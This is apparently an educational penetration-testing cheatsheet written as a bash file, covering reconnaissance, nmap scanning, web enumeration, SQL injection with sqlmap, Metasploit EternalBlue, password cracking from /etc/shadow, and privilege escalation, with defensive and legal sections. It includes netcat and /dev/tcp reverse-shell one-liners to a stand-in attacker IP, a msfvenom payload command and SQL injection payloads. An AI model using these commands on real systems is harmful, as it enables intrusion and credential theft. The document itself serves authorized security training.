#!/usr/bin/env bash
# =============================================================================
# ETHICAL HACKING FUNDAMENTALS CHEATSHEET — In-Depth Reference
# For authorized penetration testing, CTF competitions, and defensive
# security research ONLY. Every technique below assumes explicit written
# authorization (a signed scope/rules-of-engagement) or a lab/CTF environment
# you are permitted to test. Running these against systems you do not own or
# have authorization to test is illegal in most jurisdictions.
#
# Companion to "Auth & Security Notes". Read top-to-bottom; run individually.
# =============================================================================


# =============================================================================
# 1. METHODOLOGY: THE PENTEST LIFECYCLE
# =============================================================================

# 1. Reconnaissance (passive + active)  -> gather info without/with touching the target
# 2. Scanning & Enumeration                -> map open ports, services, versions
# 3. Vulnerability Analysis                   -> match findings to known CVEs/misconfigs
# 4. Exploitation                                -> prove impact (with authorization + care)
# 5. Post-Exploitation                              -> privilege escalation, lateral movement
# 6. Reporting                                        -> what matters most to the client
#
# Standard frameworks to know by name: PTES, OWASP Testing Guide, OSSTMM,
# NIST SP 800-115, MITRE ATT&CK (maps real-world adversary techniques by phase).


# =============================================================================
# 2. PASSIVE RECONNAISSANCE (OSINT — no direct contact with the target)
# =============================================================================

whois example.com                      # Domain registration info
whois 8.8.8.8                             # IP allocation / ASN owner

# Certificate transparency logs reveal subdomains issued TLS certs:
#   https://crt.sh/?q=example.com   (web lookup, or via curl)
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

theHarvester -d example.com -b google,bing,linkedin   # Emails/subdomains/hosts from public sources
recon-ng                                                 # Modular OSINT framework (many recon modules)

# Google dorking (search-engine-native recon):
#   site:example.com filetype:pdf
#   site:example.com inurl:admin
#   intitle:"index of" site:example.com

shodan search "apache" hostname:example.com    # Search internet-exposed devices/services
shodan host 8.8.8.8                               # Detail on a specific IP (Shodan CLI)

# Passive DNS / subdomain discovery without active scanning:
subfinder -d example.com                       # Aggregates many passive sources
amass enum -passive -d example.com                # Broader OSINT-based enumeration


# =============================================================================
# 3. ACTIVE RECONNAISSANCE & PORT SCANNING (NMAP)
# =============================================================================

nmap -sn 192.168.1.0/24              # Host discovery only ("ping scan"), no port scan
nmap target.com                         # Default: top 1000 TCP ports, SYN scan if root

nmap -sS -p- target.com                # SYN ("stealth") scan, all 65535 ports
nmap -sT target.com                       # Full TCP connect scan (no raw socket privileges needed)
nmap -sU -p 53,161 target.com                # UDP scan on specific ports (slow — scan sparingly)
nmap -p 22,80,443 target.com                    # Specific ports only

nmap -sV target.com                    # Service/version detection
nmap -O target.com                        # OS fingerprinting
nmap -A target.com                           # Aggressive: -sV -O -sC + traceroute (loud, easily detected)

nmap -sC target.com                    # Run default safe NSE scripts
nmap --script vuln target.com             # Run vulnerability-detection scripts
nmap --script http-enum target.com           # Enumerate common web paths
nmap --script ssl-enum-ciphers -p 443 target.com  # Enumerate supported TLS ciphers

nmap -T4 target.com                    # Faster timing template (T0 slowest/stealthiest - T5 fastest/loudest)
nmap -Pn target.com                       # Skip host-discovery ping (assume host is up — for firewalled hosts)
nmap -f target.com                          # Fragment packets (basic IDS evasion — lab use only)
nmap -oA scan_results target.com               # Output in all formats (normal/XML/grepable)

masscan -p1-65535 192.168.1.0/24 --rate=1000   # Extremely fast full-port sweep across a large range


# =============================================================================
# 4. WEB APPLICATION ENUMERATION
# =============================================================================

gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt  # Directory brute-force
gobuster dns -d target.com -w subdomains.txt                                    # Subdomain brute-force
ffuf -u https://target.com/FUZZ -w wordlist.txt                                    # Fast, flexible fuzzer
ffuf -u https://target.com/api/FUZZ -w wordlist.txt -mc 200,301,403                   # Filter by status code

nikto -h https://target.com              # Automated web server vuln/misconfig scanner
whatweb target.com                          # Fingerprint CMS/framework/server stack
wpscan --url https://target.com --enumerate p,t,u  # WordPress-specific: plugins, themes, users

curl -s https://target.com/robots.txt      # Often leaks disallowed (interesting) paths
curl -s https://target.com/sitemap.xml        # Site structure
wafw00f target.com                               # Detect which WAF (if any) sits in front


# =============================================================================
# 5. BURP SUITE WORKFLOW (WEB APP TESTING)
# =============================================================================

# 1. Configure browser proxy -> 127.0.0.1:8080, install Burp's CA cert for HTTPS interception
# 2. Proxy tab -> intercept and inspect/modify requests live
# 3. Target tab -> build the site map by browsing normally through the proxy
# 4. Repeater -> resend + tweak a single request repeatedly (test one parameter)
# 5. Intruder -> automate payload injection across a request (fuzzing, brute force)
# 6. Decoder -> quick base64/URL/hex encode-decode of captured values
# 7. Comparer -> diff two responses to spot subtle behavioral differences
# 8. Scanner (Pro) -> automated vulnerability crawl + active scan
#
# Common manual checks once inside Burp:
#   - Tamper with IDs in the URL/body (IDOR: does /api/orders/1002 return someone else's data?)
#   - Replay a request with an expired/invalid token (broken auth/session handling)
#   - Inject `' OR 1=1--` into a search/login field (SQL injection probe)
#   - Inject `<script>alert(1)</script>` into reflected input (XSS probe)


# =============================================================================
# 6. THE OWASP TOP 10 (WEB) — QUICK REFERENCE
# =============================================================================

# A01 Broken Access Control         -> IDOR, missing authorization checks, forced browsing
# A02 Cryptographic Failures          -> weak/no TLS, plaintext secrets, weak hashing (MD5/SHA1 for passwords)
# A03 Injection                          -> SQLi, NoSQLi, command injection, LDAP injection
# A04 Insecure Design                       -> missing threat modeling, flawed business logic
# A05 Security Misconfiguration                -> default creds, verbose errors, open S3 buckets, debug mode in prod
# A06 Vulnerable & Outdated Components            -> unpatched libraries/frameworks (check with `npm audit`, `pip-audit`)
# A07 Identification & Auth Failures                -> weak password policy, no MFA, session fixation
# A08 Software & Data Integrity Failures              -> unsigned updates, insecure CI/CD/deserialization
# A09 Security Logging & Monitoring Failures             -> can't detect or reconstruct an incident after the fact
# A10 Server-Side Request Forgery (SSRF)                   -> app fetches attacker-controlled URLs server-side


# =============================================================================
# 7. SQL INJECTION — PROBING & AUTOMATION
# =============================================================================

# Manual probes (authorized testing / CTF only):
#   ' OR '1'='1                     # Classic auth-bypass payload
#   ' UNION SELECT null,null,null--   # Column-count discovery for UNION-based injection
#   1' AND SLEEP(5)--                    # Time-based blind SQLi confirmation

sqlmap -u "https://target.com/item?id=1" --batch          # Automated detection + exploitation
sqlmap -u "https://target.com/item?id=1" --dbs               # Enumerate databases
sqlmap -u "https://target.com/item?id=1" -D appdb --tables      # Enumerate tables in a DB
sqlmap -u "https://target.com/item?id=1" --dump -T users           # Dump a table's contents
sqlmap -r request.txt --level 5 --risk 3                              # Feed a raw captured request, max thoroughness

# Parameterized queries / prepared statements are the actual fix — never
# string-concatenate user input into SQL. (See SQL Notes and Auth & Security Notes.)


# =============================================================================
# 8. NETWORK EXPLOITATION: METASPLOIT FRAMEWORK
# =============================================================================

msfconsole                            # Launch the framework
search type:exploit eternalblue          # Find a module by keyword
use exploit/windows/smb/ms17_010_eternalblue  # Select a module
show options                              # List required parameters for the current module
set RHOSTS 192.168.1.50                      # Set the target
set LHOST 192.168.1.5                           # Set your listener IP (for reverse payloads)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run                                                  # Execute (aliases: exploit)

# Once a session is active:
sessions -l                          # List active sessions
sessions -i 1                           # Interact with session 1
# Meterpreter commands: sysinfo, getuid, ps, migrate <pid>, hashdump, screenshot, shell

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
  # ^ Standalone payload generator (used in authorized red-team/CTF exercises)


# =============================================================================
# 9. PACKET CAPTURE & TRAFFIC ANALYSIS
# =============================================================================

# (See Networking Notes/CHEATSHEET.sh section 8 for the full tcpdump/Wireshark reference.)
tcpdump -i eth0 -w capture.pcap        # Capture traffic for later analysis
tshark -i eth0 -Y "http.request"          # Filter live capture for HTTP requests only

# Wireshark filters useful in a pentest/CTF context:
#   ftp || telnet                        # Legacy plaintext protocols leaking creds
#   http.request.method == "POST"           # Form submissions (look for creds/tokens)
#   tcp contains "password"                    # Naive plaintext credential search


# =============================================================================
# 10. PASSWORD ATTACKS: HASHCAT & JOHN THE RIPPER
# =============================================================================

# Identify a hash's algorithm first (format matters a lot):
hashid '5f4dcc3b5aa765d61d8327deb882cf99'   # Guess hash type from its structure

# hashcat (GPU-accelerated, fastest for large wordlists/mask attacks):
hashcat -m 0 -a 0 hashes.txt wordlist.txt        # -m 0 = MD5, -a 0 = dictionary attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt        # -m 1000 = NTLM
hashcat -m 1800 -a 0 hashes.txt wordlist.txt           # -m 1800 = sha512crypt (Linux /etc/shadow)
hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a'               # Brute-force mask attack, 6 chars, any charset
hashcat --show hashes.txt                                    # Show already-cracked results

# John the Ripper (flexible, strong for /etc/shadow and legacy formats):
unshadow /etc/passwd /etc/shadow > combined.txt   # Merge for cracking
john combined.txt                                    # Auto-detect format, dictionary+rules by default
john --wordlist=rockyou.txt --rules combined.txt        # Explicit wordlist + mangling rules
john --show combined.txt                                   # Show cracked results

# Common wordlists: rockyou.txt (classic leaked-password list), SecLists
# (github.com/danielmiessler/SecLists — the single most-used recon/wordlist repo).


# =============================================================================
# 11. NETCAT — THE "SWISS ARMY KNIFE"
# =============================================================================

nc -lvnp 4444                        # Listener: wait for an incoming connection
nc target.com 4444                      # Connect out to a listener
nc -zv target.com 1-1000                   # Port scan a range (basic, no service detection)

# Reverse shell (attacker listens, victim connects out — for authorized exercises):
#   Attacker: nc -lvnp 4444
#   Target:   nc -e /bin/bash attacker_ip 4444
#   (Or, if `nc -e` isn't available: bash -i >& /dev/tcp/attacker_ip/4444 0>&1)

# Bind shell (victim listens, attacker connects in):
#   Target:   nc -lvnp 4444 -e /bin/bash
#   Attacker: nc target_ip 4444

# File transfer over netcat:
#   Receiver: nc -lvnp 4444 > received_file
#   Sender:   nc receiver_ip 4444 < file_to_send


# =============================================================================
# 12. PRIVILEGE ESCALATION — QUICK ENUMERATION
# =============================================================================

# Linux:
sudo -l                              # What can this user run as root without a password?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries (potential escalation vectors)
uname -a                                    # Kernel version -> check for known kernel exploits
cat /etc/crontab; ls -la /etc/cron.*            # Scheduled jobs run by root (writable script = escalation)
getcap -r / 2>/dev/null                            # Files with elevated Linux capabilities set

# Automated enumeration scripts (run only in authorized/lab environments):
#   linpeas.sh          -> Linux privilege escalation enumeration
#   winPEAS.exe          -> Windows equivalent
#   LinEnum.sh              -> Older but still common Linux enum script

# Windows:
whoami /priv                          # Current user's privileges (look for SeImpersonatePrivilege etc.)
systeminfo                               # OS version/patch level -> check known local-exploit CVEs
net user                                    # List local users
net localgroup administrators                 # Who's in the local admin group


# =============================================================================
# 13. CTF-SPECIFIC TOOLING
# =============================================================================

strings binary_file                  # Extract printable strings from a binary (quick recon)
file unknown_file                       # Identify file type from magic bytes
binwalk firmware.bin                       # Extract embedded files/filesystems from a firmware image
exiftool image.jpg                            # Read/strip EXIF metadata (steganography/OSINT clues)
steghide extract -sf image.jpg                   # Extract hidden data from a stego image (if password-protected, needs it)

CyberChef                             # Web-based "swiss army knife" for encode/decode/crypto chains (offline-capable)
gdb -q ./binary                          # Debugger, core of most binary-exploitation (pwn) challenges
checksec ./binary                           # Check binary protections: NX, PIE, ASLR, stack canaries, RELRO


# =============================================================================
# 14. DEFENSIVE COUNTERPART: WHAT BLUE TEAM WATCHES FOR
# =============================================================================

# - Port scans        -> spikes in SYN packets to sequential ports from one source (IDS/IPS alert)
# - Brute force          -> repeated auth failures from one IP/account in a short window
# - SQLi/XSS attempts       -> WAF logs showing payload signatures (quotes, script tags, UNION SELECT)
# - Privilege escalation      -> unexpected sudo usage, new SUID binaries, unusual cron entries
# - Lateral movement             -> unusual internal SMB/RDP/WinRM connections between hosts
# - C2 beaconing                    -> regular-interval outbound connections to unfamiliar domains/IPs
#
# Tools: Snort/Suricata (network IDS), OSSEC/Wazuh (host IDS), the ELK/Elastic
# stack or Splunk for log correlation, MITRE ATT&CK Navigator for mapping
# detections to known adversary techniques. See "Auth & Security Notes" and
# "Observability Notes" for the logging/monitoring side of this.


# =============================================================================
# 15. LEGAL & ETHICAL BOUNDARIES — NON-NEGOTIABLE
# =============================================================================

# - Get written authorization (a signed scope of work / rules of engagement)
#   before testing ANY system you do not personally own.
# - Practice legally on: TryHackMe, HackTheBox, PortSwigger Web Security Academy,
#   OWASP Juice Shop / DVWA (deliberately vulnerable apps), local VMs you built.
# - Relevant certifications that formalize this knowledge: CompTIA Security+,
#   CEH, OSCP (hands-on, widely respected), eJPT (entry-level, practical).
# - Unauthorized access to computer systems is a criminal offense in essentially
#   every jurisdiction (e.g., the U.S. Computer Fraud and Abuse Act) regardless
#   of intent — "I was just testing" is not a legal defense without authorization.
